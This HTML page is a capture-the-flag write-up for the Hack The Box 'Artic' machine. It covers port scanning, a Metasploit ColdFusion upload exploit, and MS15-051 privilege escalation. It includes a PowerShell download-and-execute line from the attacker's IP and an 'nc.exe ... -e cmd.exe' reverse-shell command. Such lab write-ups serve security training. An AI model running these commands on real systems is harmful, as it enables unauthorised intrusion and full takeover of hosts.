@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Artic - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Artic"><a href="#Hack-The-Box-Artic" class="headerlink" title="Hack The Box - Artic"></a>Hack The Box - Artic</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Artic is a medium difficult target. Basic troubleshooting is required to get the correct exploit functioning properly, Its IP address is <code>10.10.10.11.</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/artic/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">|-------(root@kali)-------|(/home/kali)<br> |<br> |-->{SFire129}#nmap -A -v 10.10.10.11
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 18:10 EDT
+ NSE: Loaded 151 scripts for scanning.
+ NSE: Script Pre-scanning.
+ Completed NSE at 18:13, 0.00s elapsed
+ Nmap scan report for 10.10.10.11
+ Host is up (0.20s latency).
+ Not shown: 997 filtered ports
+ PORT      STATE SERVICE VERSION
+ 135/tcp   open  msrpc   Microsoft Windows RPC
+ 8500/tcp  open  fmtp?
+ 49154/tcp open  msrpc   Microsoft Windows RPC
+ Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+ Device type: general purpose|phone|specialized
+ Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
+ OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012
+ Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
+ No exact OS matches for host (test conditions non-ideal).
+ Uptime guess: 0.961 days (since Mon May 18 19:09:14 2020)
+ Network Distance: 2 hops
+ TCP Sequence Prediction: Difficulty=260 (Good luck!)
+ IP ID Sequence Generation: Incremental
+ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ TRACEROUTE (using port 135/tcp)
+ HOP RTT       ADDRESS
+ 1   169.84 ms 10.10.14.1
+ 2   174.54 ms 10.10.10.11
+ 
+ NSE: Script Post-scanning.
+ Initiating NSE at 18:13
+ Completed NSE at 18:13, 0.00s elapsed
+ Initiating NSE at 18:13
+ Completed NSE at 18:13, 0.00s elapsed
+ Initiating NSE at 18:13
+ Completed NSE at 18:13, 0.00s elapsed
+ Read data files from: /usr/bin/../share/nmap
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 174.36 seconds
+            Raw packets sent: 2096 (96.012KB) | Rcvd: 45 (2.788KB)
+<br></figure></pre
+<p>Browse to 8500 port and view the service is Coldfusion.
+<br>
+<img src="/images/hackthebox/exploit/artic/1.png" alt=""></p>
+<br>
+<p> Search some exploit for Coldfusion.
+<pre><figure class="highlight plain">|-------(root@kali)-------|(~/HackTheBox/artic)<br>|<br>|-->{SFire129}#searchsploit coldfusion
+ ----------------------------------------------------------------------------------------------------------- ----------------------------------------
+  Exploit Title                                                                                             |  Path
+                                                                                                            | (/usr/share/exploitdb/)
+ ----------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                        | exploits/cfm/webapps/36067.txt
+ Adobe ColdFusion - Directory Traversal                                                                     | exploits/multiple/remote/14641.py
+ Adobe ColdFusion - Directory Traversal (Metasploit)                                                        | exploits/multiple/remote/16985.rb
+ Adobe ColdFusion 2018 - Arbitrary File Upload                                                              | exploits/multiple/webapps/45979.txt
+ Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                          | exploits/cfm/webapps/29567.txt
+ Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                         | exploits/cfm/webapps/36172.txt
+ Adobe ColdFusion 9 - Administrative Authentication Bypass                                                  | exploits/windows/webapps/27755.txt
+ Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                                     | exploits/multiple/remote/30210.rb
+ Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                                            | exploits/multiple/webapps/40346.py
+ Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                                  | exploits/multiple/remote/24946.rb
+ Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Scripting               | exploits/cfm/webapps/33170.txt
+ Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query String Cross-Site Scri | exploits/cfm/webapps/33167.txt
+ Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-Site Scripting     | exploits/cfm/webapps/33169.txt
+ Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Site Scripting      | exploits/cfm/webapps/33168.txt
+ Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                | exploits/windows/remote/43993.py
+ Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                        | exploits/multiple/remote/19093.txt
+ Allaire ColdFusion Server 4.0.1 - 'CFCRYPT.EXE' Decrypt Pages                                              | exploits/windows/local/19220.c
+ Allaire ColdFusion Server 4.0/4.0.1 - 'CFCACHE' Information Disclosure                                     | exploits/multiple/remote/19712.txt
+ ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                          | exploits/cfm/webapps/16788.rb
+ ColdFusion 9-10 - Credential Disclosure                                                                    | exploits/multiple/webapps/25305.py
+ ColdFusion MX - Missing Template Cross-Site Scripting                                                      | exploits/cfm/remote/21548.txt
+ ColdFusion MX - Remote Development Service                                                                 | exploits/windows/remote/50.pl
+ ColdFusion Scripts Red_Reservations - Database Disclosure                                                  | exploits/asp/webapps/7440.txt
+ ColdFusion Server 2.0/3.x/4.x - Administrator Login Password Denial of Service                             | exploits/multiple/dos/19996.txt
+ Macromedia ColdFusion MX 6.0 - Error Message Full Path Disclosure                                          | exploits/cfm/webapps/22544.txt
+ Macromedia ColdFusion MX 6.0 - Oversized Error Message Denial of Service                                   | exploits/multiple/dos/24013.txt
+ Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                  | exploits/multiple/remote/22867.pl
+ Macromedia ColdFusion MX 6.0 - SQL Error Message Cross-Site Scripting                                      | exploits/cfm/webapps/23256.txt
+ Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                      | exploits/multiple/remote/24654.txt
+ ----------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Shellcodes: No Result
+ |-------(root@kali)-------|(~/HackTheBox/artic)
+ |
+ |-->{SFire129}# <br></figure></pre>
+<p> The result show an exploit <code>ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) | exploits/cfm/webapps/16788.rb</code>
+<br> 
+<h2 id="Uploading Web Shell"><a href="#Uploading-Web-Shell" class="headerlink" title="Uploading Web Shell"></a>Uploading Web Shell</h2>
+<p> Setup the metasploit with the Coldfusion exploit found.
+<br>
+<pre><figure class="highlight plain">
+         =[ metasploit v5.0.89-dev-                         ]
+ + -- --=[ 2017 exploits - 1099 auxiliary - 343 post       ]
+ + -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ + -- --=[ 7 evasion                                       ]
+ 
+ Metasploit tip: Adapter names can be used for IP params set LHOST eth0
+ 
+ msf5 > search coldfusion
+ 
+ Matching Modules
+ ================
+ 
+    #  Name                                                           Disclosure Date  Rank       Check  Description
+    -  ----                                                           ---------------  ----       -----  -----------
+    0  auxiliary/gather/coldfusion_pwd_props                          2013-05-07       normal     Yes    ColdFusion 'password.properties' Hash Extraction
+    1  auxiliary/scanner/http/adobe_xml_inject                                         normal     No     Adobe XML External Entity Injection
+    2  auxiliary/scanner/http/coldfusion_locale_traversal                              normal     No     ColdFusion Server Check
+    3  auxiliary/scanner/http/coldfusion_version                                       normal     No     ColdFusion Version Scanner
+    4  exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce  2016-03-28       excellent  Yes    HID discoveryd command_blink_on Unauthenticated RCE
+    5  exploit/multi/http/coldfusion_ckeditor_file_upload             2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload
+    6  exploit/multi/http/coldfusion_rds_auth_bypass                  2013-08-08       great      Yes    Adobe ColdFusion RDS Authentication Bypass
+    7  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute
+ 
+ 
+ msf5 > use exploit/windows/http/coldfusion_fckeditor
+ msf5 exploit(windows/http/coldfusion_fckeditor) > set rhosts 10.10.10.11
+ rhosts => 10.10.10.11
+ msf5 exploit(windows/http/coldfusion_fckeditor) > set rport 8500
+ rport => 8500
+ msf5 exploit(windows/http/coldfusion_fckeditor) > set payload  generic/shell_reverse_tcp
+ payload => generic/shell_reverse_tcp
+ msf5 exploit(windows/http/coldfusion_fckeditor) > set LHOST 10.10.14.25
+ LHOST => 10.10.14.25
+ msf5 exploit(windows/http/coldfusion_fckeditor) > run
+ 
+ [*] Started reverse TCP handler on 10.10.14.25:4444
+ [*] Sending our POST request...
+ [-] Upload Failed...
+ [*] Exploit completed, but no session was created.
+ msf5 exploit(windows/http/coldfusion_fckeditor) > <br></figure></pre
+<br>
+<p>The exploit failed, run the <code>BurpSuite</code> as a proxy from 127.0.0.1:8500 redirect to 10.10.10.11:8500 to find the issue.
+<br>
+<img src="/images/hackthebox/exploit/artic/2.png" alt=""><br>
+<img src="/images/hackthebox/exploit/artic/3.png" alt="">
+<br>
+<p>Configure again the metasploit with the new ip address 127.0.0.1
+<pre><figure class="highlight plain"> msf5 exploit(windows/http/coldfusion_fckeditor) > set rhosts 127.0.0.1
+ rhosts => 127.0.0.1
+ msf5 exploit(windows/http/coldfusion_fckeditor) > run
+ 
+ [*] Started reverse TCP handler on 10.10.14.25:4444
+ [*] Sending our POST request...
+ [-] Upload Failed...
+ [*] Exploit completed, but no session was created.
+ msf5 exploit(windows/http/coldfusion_fckeditor) </figure></pre
+ <br>
+ <p> In the burp suite, send to repeater.
+ <br>
+ <img src="/images/hackthebox/exploit/artic/4.png" alt="">
+ <br>
+ <p>The result show that file was uploaded as  <code>/userfiles/file/WKOMTR.jsp</code>
+<br>
+<img src="/images/hackthebox/exploit/artic/5.png" alt="">
+<br>
+<h2 id="Webshell-Execution"><a href="#Webshell-Execution" class="headerlink" title="Webshell Execution"></a> Webshell Execution</h2>
+ <br>
+ <p> Run the nc in kali linux with 4444 port and get the url http://10.10.10.11:8500/userfiles/file/WKOMTR.jsp
+ <br>
+ <img src="/images/hackthebox/exploit/artic/6.png" alt="">
+ <img src="/images/hackthebox/exploit/artic/7.png" alt="">
+ <br>
+ <pre><figure class="highlight plain">C:\ColdFusion8\runtime\bin>cd ..
+ C:\ColdFusion8\runtime>cd ..
+ C:\ColdFusion8>cd ..
+ C:\cd Users
+ C:\Users>dir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is F88F-4EA5
+ 
+  Directory of C:\Users
+ 
+ 22/03/2017  10:00     DIR          .
+ 22/03/2017  10:00     DIR          ..
+ 22/03/2017  09:10     DIR          Administrator
+ 14/07/2009  07:57     DIR          Public
+ 22/03/2017  10:00     DIR          tolis
+                0 File(s)              0 bytes
+                5 Dir(s)  32.972.091.392 bytes free
+ 
+ C:\Users>cd tolis
+ C:\Users\tolis>cd Desktop
+ C:\Users\tolis\Desktop>type user.txt
+ type user.txt
+ ***Here You could be found the flag user***
+ C:\Users\tolis\Desktop></figure></pre
+<br>
+  <h2 id="Get-Privileges"><a href="#Get-Privilege" class="headerlink" title="Get Privilege"></a>Get Privileges</h2>
+ <p> Run the command <code>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"</code> to get OS version.
+ <pre><figure class="highlight plain">C:\ColdFusion8\runtime\bin>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+ OS Name:                   Microsoft Windows Server 2008 R2 Standard
+ OS Version:                6.1.7600 N/A Build 7600
+ 
+ C:\ColdFusion8\runtime\bin>></figure></pre
+<br>
+<p> Run the command <code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%</code> for OS Achitecture
+
+<pre><figure class="highlight plain">C:\ColdFusion8\runtime\bin>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+ wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
+ OSArchitecture
+ 64-bit
+ C:\ColdFusion8\runtime\bin> </figure></pre
+<br>
+<p> Run the command <code>wmic qfe</code> for extract PACTH and Updates.
+
+<pre><figure class="highlight plain">C:\ColdFusion8\runtime\bin>wmic qfe
+ wmic qfe
+ C:\ColdFusion8\runtime\bin>
+</figure></pre
+ <img src="/images/hackthebox/exploit/artic/8.png" alt="">
+<br>
+<p> The machine is a Windows server 2008 R2 standard OS, is x64 Architecture and don't have Patch/Updates.
+<br>
+<p>Now, we need to view if the machine has some vulnerabilities, for this needs to execute script  <a class="vglnk" href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" rel="nofollow"><span>Sherlock</span></a> </a> and add this row<code>Find-AllVulns</code> to final script.
+<br>
+  <img src="/images/hackthebox/exploit/artic/9.png" alt="">
+  <br>
+ 
+<p><code>echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.25:81/Sherlock.ps1") | powershell -noprofile - </code> 
+ <img src="/images/hackthebox/exploit/artic/11.png" alt="">
+ <br>
+ <p>The output look like this and find some vulnerability:
+ <br>
+  <pre><figure class="highlight plain">echo iex (New-Object Net.WebClient).DownloadString("http://10.10.14.25:81/Sherlock.ps1") | powershell -noprofile -
+  
+ Title      : User Mode to Ring (KiTrap0D)
+ MSBulletin : MS10-015
+ CVEID      : 2010-0232
+ Link       : https://www.exploit-db.com/exploits/11199/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : Task Scheduler .XML
+ MSBulletin : MS10-092
+ CVEID      : 2010-3338, 2010-3888
+ Link       : https://www.exploit-db.com/exploits/19930/
+ VulnStatus : Appears Vulnerable
+ 
+ Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+ MSBulletin : MS13-053
+ CVEID      : 2013-1300
+ Link       : https://www.exploit-db.com/exploits/33213/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : TrackPopupMenuEx Win32k NULL Page
+ MSBulletin : MS13-081
+ CVEID      : 2013-3881
+ Link       : https://www.exploit-db.com/exploits/31576/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : TrackPopupMenu Win32k Null Pointer Dereference
+ MSBulletin : MS14-058
+ CVEID      : 2014-4113
+ Link       : https://www.exploit-db.com/exploits/35101/
+ VulnStatus : Not Vulnerable
+ 
+ Title      : ClientCopyImage Win32k
+ MSBulletin : MS15-051
+ CVEID      : 2015-1701, 2015-2433
+ Link       : https://www.exploit-db.com/exploits/37367/
+ VulnStatus : Appears Vulnerable
+ 
+ Title      : Font Driver Buffer Overflow
+ MSBulletin : MS15-078
+ CVEID      : 2015-2426, 2015-2433
+ Link       : https://www.exploit-db.com/exploits/38222/
+ VulnStatus : Not Vulnerable
+ 
+ Title      : 'mrxdav.sys' WebDAV
+ MSBulletin : MS16-016
+ CVEID      : 2016-0051
+ Link       : https://www.exploit-db.com/exploits/40085/
+ VulnStatus : Not supported on 64-bit systems
+ 
+ Title      : Secondary Logon Handle
+ MSBulletin : MS16-032
+ CVEID      : 2016-0099
+ Link       : https://www.exploit-db.com/exploits/39719/
+ VulnStatus : Appears Vulnerable
+ 
+ Title      : Windows Kernel-Mode Drivers EoP
+ MSBulletin : MS16-034
+ CVEID      : 2016-0093/94/95/96
+ Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+              6-034?
+ VulnStatus : Not Vulnerable
+ 
+ Title      : Win32k Elevation of Privilege
+ MSBulletin : MS16-135
+ CVEID      : 2016-7255
+ Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+              ample-Exploits/MS16-135
+ VulnStatus : Not Vulnerable
+ 
+ Title      : Nessus Agent 6.6.2 - 6.10.3
+ MSBulletin : N/A
+ CVEID      : 2017-7199
+ Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+              tml
+ VulnStatus : Not Vulnerable </figure></pre
+ 
+<p>The script show us that this machine has a vulnerability <code><a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>MS15-051</span></a></code> for OS x64. Download the script in Kali linux and run smbserver.py for to share script.
+<br>
+<p>1.)Run <code>smbserver.py</code> with <code><a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>MS15-051.exe</span></a></code> inside.<br>
+<p>2.)From reverse shell execute <code>copy \\10.10.14.25\FOLDER\*.exe</code>to get the nc.exe and ms15-051.exe<br>
+<br>copy \\10.10.14.25\FOLDER\ms15-051.exe ms15-051.exe
+<br>copy \\10.10.14.25\FOLDER\nc.exe nc.exe
+<br>
+  <img src="/images/hackthebox/exploit/artic/10.png" alt="">
+  <br>
+ <p>
+<p>Run the command <code>ms51-015.exe whoami</code> for view the permisions.
+<br>
+ <pre><figure class="highlight plain">C:\ColdFusion8\runtime\bin>ms15-051.exe "whoami"
+ ms15-051.exe "whoami"
+ [#] ms15-051 fixed by zcgonvh
+ [!] process with pid: 3340 created.
+ ==============================
+ nt authority\system
+
+ C:\ColdFusion8\runtime\bin></figure></pre 
+
+   <h2 id="Capture the Flag"><a href="#Capture-the-Flag" class="headerlink" title="Capture the Flag"></a>Capture the Flag</h2>
+  <p>1.)Launch in kali linux a nc on port 4445.
+  <p>2.)Launch <code><a class="vglnk" href="https://github.com/diegoexploit/HackTheBox/blob/master/ms15-051.exe" rel="nofollow"><span>ms15-051.exe </span></a>"nc.exe 10.10.14.25 4445 -e cmd.exe"</code> for reverse shell with system privileges.
+  <br>
+  <img src="/images/hackthebox/exploit/artic/12.png" alt="">
+  <br>
+  <p>Capture de root flag.
+  <br>
+    <pre><figure class="highlight plain">c:\ColdFusion8\runtime\bin>cd c:\
+ c:\>cd Users
+ c:\Users>cd Administrator
+ c:\Users\Administrator>cd Desktop
+ c:\Users\Administrator\Desktop>type root.txt
+ type root.txt
+ ***Here you could be find the root flag***
+ c:\Users\Administrator\Desktop>
+   </figure></pre
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-19</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#capture-the-Flag</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
